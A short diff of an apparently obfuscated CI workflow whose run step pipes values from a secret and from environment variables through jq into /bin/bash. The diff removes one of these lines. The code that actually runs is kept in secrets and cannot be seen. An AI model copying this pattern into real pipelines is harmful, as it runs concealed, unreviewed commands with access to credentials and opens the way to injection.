@@ -19,7 +19,6 @@ jobs:
           f43: ${{ secrets.f43 }}
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
-          printf '%s' "$ggvha296" | jq -r .pfpa4110 | /bin/bash
           echo $flu61241 | jq -r .fjvqn49126 | /bin/bash
 
       - name: Archive output
